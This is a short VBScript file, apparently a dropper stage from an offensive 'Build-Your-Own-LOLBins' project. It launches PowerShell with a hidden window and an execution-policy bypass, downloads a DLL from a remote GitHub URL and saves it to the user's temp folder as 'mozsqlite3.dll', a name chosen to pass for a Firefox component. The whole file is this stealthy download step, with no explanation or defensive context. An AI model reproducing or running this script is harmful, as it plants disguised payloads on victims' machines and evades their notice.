Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -w hidden -exec bypass -nop -noexit -c iwr -Uri https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/dll/byol.dll -OutFile $env:temp\mozsqlite3.dll"
